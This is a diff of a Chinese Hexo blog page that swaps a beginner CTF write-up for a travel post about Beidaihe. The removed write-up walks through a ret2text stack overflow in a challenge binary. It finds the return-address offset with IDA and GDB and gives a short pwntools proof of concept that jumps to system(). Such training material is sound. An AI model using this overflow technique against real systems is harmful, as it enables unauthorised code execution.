@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="YLL">
   <meta name="keywords" content="">
-  <title>pwn之ret2text - YLL-F11</title>
+  <title>北戴河之旅 - YLL-F11</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -165,8 +165,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2020-09-10 11:02" pubdate>
-        2020年9月10日 上午
+      <time datetime="2020-10-09 15:32" pubdate>
+        2020年10月9日 下午
       </time>
     </span>
   
@@ -177,7 +177,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      474 字
+      593 字
     </span>
   
 
@@ -187,7 +187,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      5
+      6
        分钟
     </span>
   
@@ -225,29 +225,16 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto" id="post">
             <!-- SEO header -->
-            <h1 style="display: none">pwn之ret2text</h1>
+            <h1 style="display: none">北戴河之旅</h1>
             
             <div class="markdown-body" id="post-body">
-              <h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>题目下载<a target="_blank" rel="noopener" href="https://github.com/YLL-F1/pwn/raw/master/ret2text">下载地址</a></p>
-<h3 id="web狗的转型之路"><a href="#web狗的转型之路" class="headerlink" title="web狗的转型之路"></a>web狗的转型之路</h3><p>before long history。。。。。。之前，一直在web层的安全进行专研，偶然一次接触pwn题，感觉在安全路上又找到了一个新的起点。接下来也会慢慢步入pwn中，了解二进制中的安全。</p>
-<h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><h3 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h3><ul>
-<li><font color=red>gdb:</font> linux下的动态调试工具。  </li>
-<li><font color=red>ida:</font> 方便windows下静态查看的反编译工具。  </li>
-</ul>
-<h3 id="题目大概"><a href="#题目大概" class="headerlink" title="题目大概"></a>题目大概</h3><p><img src="/images/ret2text/6.png" srcset="/img/loading.gif"><br>初步运行该文件，发现该文件功能大致为输入，输出。<br><img src="/images/ret2text/1.png" srcset="/img/loading.gif"><br>IDA还原C代码，可以发现主函数使用gets()进行输入，printf()进行输出。 </p>
-<h3 id="概要分析"><a href="#概要分析" class="headerlink" title="概要分析"></a>概要分析</h3><p><img src="/images/ret2text/2.png" srcset="/img/loading.gif"> </p>
-<p><img src="/images/ret2text/5.png" srcset="/img/loading.gif"><br>IDA分析发现的看到两个关键点分别为gets()，system()。正常运行题目文件会在输入参数后跳转到printf()函数，是无法跳转到system函数。所以，我们要利用C语言中的gets()函数存在溢出漏洞进行填充溢出至system()函数地址```0x0804863A``，去执行system()函数。</p>
-<h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>ida静态分析，定位到gets()函数地址。F5还原C代码，ida显示s到ebp的偏移为64h，但ida的静态分析可能存在不准确信，所有再用gdb动态进行分析确定。<br>使用GDB在gets()函数地址080486AE下断点 <code>b *0x080486AE</code><br>输入<code>r</code>运行<br><img src="/images/ret2text/3.png" srcset="/img/loading.gif"><br>变量s到EBP的偏移为|0x0ffffcfd8-0xffffcf6c|=0x6C，所以s相对与返回地址的偏移为0x6c+4=0x70，所以ida的偏移64h还是存在偏差。所以溢出偏移量为0x6C+0x04(return地址)=0x70。</p>
-<h3 id="GDB-pattern计算偏移量"><a href="#GDB-pattern计算偏移量" class="headerlink" title="GDB pattern计算偏移量"></a>GDB pattern计算偏移量</h3><p><img src="/images/ret2text/7.png" srcset="/img/loading.gif"><br>在get()函数的下一个地址下断点，进入输入参数阶段。<br><img src="/images/ret2text/9.png" srcset="/img/loading.gif"><br>使用<code>pattern_create 200</code>生成随机200个字符，来进行溢出输入。<br><img src="/images/ret2text/10.png" srcset="/img/loading.gif">  </p>
-<p><img src="/images/ret2text/11.png" srcset="/img/loading.gif"><br>使用GDB pattern通过溢出的地址计算出偏移量为112=0x70。</p>
-<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code class="hljs aidl">from pwn import *
-
-sh &#x3D; process(&quot;.&#x2F;ret2text&quot;)
-binsh_addr &#x3D; 0x0804863a
-payload &#x3D; flat([&quot;A&quot; * 0x70, binsh_addr])
-sh.sendline(payload)
-sh.interactive()</code></pre>
-<p>编写POC，成功调用system函数。<br><img src="/images/ret2text/12.png" srcset="/img/loading.gif">  </p>
+              <h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p>今天年的国庆节并未想好去哪？上海、三亚、威海。。。。很多地方在我脑中闪过，因为从小在内陆长大一直对大海有一直莫名的向往。但国庆又是一个很特别的期间，游客之多难以想象。再一次朋友的推荐下，我选择了北戴河。</p>
+<h3 id="行程规划"><a href="#行程规划" class="headerlink" title="行程规划"></a>行程规划</h3><p>出发地:<code>北京站</code><br>目的地:<code>北戴河站</code><br>时间:<code>2小时</code></p>
+<h3 id="酒店住宿"><a href="#酒店住宿" class="headerlink" title="酒店住宿"></a>酒店住宿</h3><p>地点:<code>南戴河金海岸</code><br>价格:<code>350左右/天</code></p>
+<h3 id="鸽子窝公园"><a href="#鸽子窝公园" class="headerlink" title="鸽子窝公园"></a>鸽子窝公园</h3><p>网上说，鸽子屋的日出是很美的。但我早上并没有起来，就在酒店看了看日出，海上的日出确实让我眼前一亮，很美。<br>收拾完后，到了鸽子屋大概10点左右，相对其他地方的景点来说，人数应该算是一吧。门票价25元一位，价格很亲民。<br>我和女朋友一起去的，沙滩上一边走一边看海鸽子，偶而不远的地方还有一片小礁石，很多大人带着小孩在那里抓螃蟹、皮皮虾、贝壳。</p>
+<h3 id="刘庄夜市"><a href="#刘庄夜市" class="headerlink" title="刘庄夜市"></a>刘庄夜市</h3><p>刘庄夜市距离鸽子屋坐公交车只有2站的距离，不是很远。这里主要是个小吃的地方，东西的感觉较贵一些，味道整体给4颗星吧，还行。<br>不过这里的建筑分格很有特色，繁华中不失唯美。</p>
+<h3 id="碧螺岛"><a href="#碧螺岛" class="headerlink" title="碧螺岛"></a>碧螺岛</h3><p>碧螺岛位于黄金海岸对面，距离酒店很近。但需要乘坐缆车过去，票价是95，还包括一个海上游船票，我个人觉的游船不太好玩。<br>但是缆车还是相当不错的，坐在缆车上，在高空眺望大海。。。。。</p>
+<h3 id="南戴河金海岸"><a href="#南戴河金海岸" class="headerlink" title="南戴河金海岸"></a>南戴河金海岸</h3><p>大概下午5点中左右，延着黄金海岸一直往南走去，不远处你会发现一个渔民出海归来的地方。此时正是渔民打鱼归来，夕阳照射下的渔船是那么的唯美，<br>接着一框一筐的海鲜被搬上岸来，有螃蟹、海星、拳头大的海螺等等。。。。由于我正好10月份去，刚好赶上梭子蟹正肥的时候。<br>从渔民手里购买会比市场便宜很多而且又新鲜，如果你砍价的能力强的话，200多可以买很多东西。</p>
 
             </div>
             <hr>
@@ -258,7 +245,7 @@ sh.interactive()</code></pre>
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
+                      <a class="hover-with-bg" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
                     
                   </div>
                 
@@ -271,18 +258,12 @@ sh.interactive()</code></pre>
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2020/09/20/%E7%AE%80%E5%8D%95%E7%9A%84Telegram%E6%9C%BA%E5%99%A8%E4%BA%BA/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">简单的Telegram机器人</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2020/08/31/%E6%9F%90X%E6%9C%8D%E5%AE%A1%E8%AE%A1/">
-                        <span class="hidden-mobile">某X服EDR审计</span>
+                      <a href="/2020/09/20/%E7%AE%80%E5%8D%95%E7%9A%84Telegram%E6%9C%BA%E5%99%A8%E4%BA%BA/">
+                        <span class="hidden-mobile">简单的Telegram机器人</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -460,7 +441,7 @@ sh.interactive()</code></pre>
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "pwn之ret2text&nbsp;",
+        "北戴河之旅&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
